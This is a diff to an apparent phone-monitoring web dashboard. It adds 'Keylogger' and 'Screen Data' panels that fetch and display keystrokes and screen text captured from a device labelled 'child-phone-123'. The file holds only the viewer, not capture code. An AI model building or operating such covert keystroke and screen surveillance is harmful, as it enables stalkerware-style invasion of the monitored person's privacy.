@@ -226,6 +226,34 @@ body {
     font-size: 10px;
 }
 
+.keylog-box, .screen-box {
+    background: #181214;
+    border: 1px solid #342326;
+    border-radius: 10px;
+    padding: 17px;
+    margin-top: 12px;
+}
+
+.keylog-entry {
+    padding: 10px;
+    border-bottom: 1px solid #2a1d20;
+    font-size: 11px;
+    color: #ddd;
+}
+
+.keylog-time {
+    color: #777;
+    font-size: 9px;
+    margin-left: 8px;
+}
+
+.screen-text {
+    white-space: pre-wrap;
+    font-size: 12px;
+    line-height: 1.6;
+    color: #ccc;
+}
+
 @media(max-width:700px) {
     .apps {
         grid-template-columns: repeat(2, 1fr);
@@ -296,6 +324,16 @@ body {
         <button class="control-btn"
                 onclick="showGPS(this)">
             📍 GPS Tracker
+        </button>
+
+        <button class="control-btn"
+                onclick="showKeylog(this)">
+            ⌨ Keylogger
+        </button>
+
+        <button class="control-btn"
+                onclick="showScreenData(this)">
+            🖥 Screen Data
         </button>
 
     </div>
@@ -450,32 +488,108 @@ body {
 
     </section>
 
+
+    <!-- KEYLOGGER PANEL -->
+
+    <section class="panel" id="keylogPanel" style="display:none;">
+
+        <div class="panel-header">
+
+            <div class="panel-title">
+                ⌨ Keylogger
+            </div>
+
+            <button class="refresh" onclick="refreshKeylog()">
+                ⟳ Refresh
+            </button>
+
+        </div>
+
+        <div class="keylog-box" id="keylogContent">
+            Loading keylogs...
+        </div>
+
+    </section>
+
+
+    <!-- SCREEN DATA PANEL -->
+
+    <section class="panel" id="screenPanel" style="display:none;">
+
+        <div class="panel-header">
+
+            <div class="panel-title">
+                🖥 Screen Data
+            </div>
+
+            <button class="refresh" onclick="refreshScreenData()">
+                ⟳ Refresh
+            </button>
+
+        </div>
+
+        <div class="screen-box">
+            <div class="screen-text" id="screenTextContent">
+                Loading screen data...
+            </div>
+        </div>
+
+    </section>
+
 </main>
 
 
 <script>
 
 function showApps(button) {
-
     document.querySelectorAll(".control-btn")
         .forEach(btn => btn.classList.remove("active"));
-
     button.classList.add("active");
 
     document.getElementById("appsPanel").style.display = "block";
     document.getElementById("gpsPanel").style.display = "none";
+    document.getElementById("keylogPanel").style.display = "none";
+    document.getElementById("screenPanel").style.display = "none";
 }
 
 
 function showGPS(button) {
-
     document.querySelectorAll(".control-btn")
         .forEach(btn => btn.classList.remove("active"));
-
     button.classList.add("active");
 
     document.getElementById("appsPanel").style.display = "none";
     document.getElementById("gpsPanel").style.display = "block";
+    document.getElementById("keylogPanel").style.display = "none";
+    document.getElementById("screenPanel").style.display = "none";
+}
+
+
+function showKeylog(button) {
+    document.querySelectorAll(".control-btn")
+        .forEach(btn => btn.classList.remove("active"));
+    button.classList.add("active");
+
+    document.getElementById("appsPanel").style.display = "none";
+    document.getElementById("gpsPanel").style.display = "none";
+    document.getElementById("keylogPanel").style.display = "block";
+    document.getElementById("screenPanel").style.display = "none";
+
+    refreshKeylog();
+}
+
+
+function showScreenData(button) {
+    document.querySelectorAll(".control-btn")
+        .forEach(btn => btn.classList.remove("active"));
+    button.classList.add("active");
+
+    document.getElementById("appsPanel").style.display = "none";
+    document.getElementById("gpsPanel").style.display = "none";
+    document.getElementById("keylogPanel").style.display = "none";
+    document.getElementById("screenPanel").style.display = "block";
+
+    refreshScreenData();
 }
 
 
@@ -488,7 +602,62 @@ function demoGPS() {
     alert("Demo GPS: no real location is being collected.");
 }
 
+
+async function refreshKeylog() {
+    const deviceId = "child-phone-123"; // Change to your actual device ID
+    const container = document.getElementById("keylogContent");
+    container.innerHTML = "Loading...";
+
+    try {
+        const response = await fetch(`/api/keylog?deviceId=${deviceId}`);
+        if (!response.ok) throw new Error("Failed");
+        const logs = await response.json();
+
+        if (logs.length === 0) {
+            container.innerHTML = "No keylogs yet.";
+            return;
+        }
+
+        container.innerHTML = logs.map(log => `
+            <div class="keylog-entry">
+                ${escapeHtml(log.text)}
+                <span class="keylog-time">${new Date(log.timestamp).toLocaleTimeString()}</span>
+            </div>
+        `).join("");
+    } catch (e) {
+        console.error(e);
+        container.innerHTML = "Error loading keylogs.";
+    }
+}
+
+
+async function refreshScreenData() {
+    const deviceId = "child-phone-123"; // Change to your actual device ID
+    const content = document.getElementById("screenTextContent");
+
+    try {
+        const response = await fetch(`/api/ui?deviceId=${deviceId}`);
+        if (!response.ok) throw new Error("Failed");
+        const data = await response.json();
+
+        content.textContent = data.uiText || "No screen data yet.";
+    } catch (e) {
+        console.error(e);
+        content.textContent = "Error loading screen data.";
+    }
+}
+
+
+function escapeHtml(value) {
+    return String(value)
+        .replaceAll("&", "&amp;")
+        .replaceAll("<", "&lt;")
+        .replaceAll(">", "&gt;")
+        .replaceAll('"', "&quot;")
+        .replaceAll("'", "&#039;");
+}
+
 </script>
 
 </body>
-          </html>
+    </html>
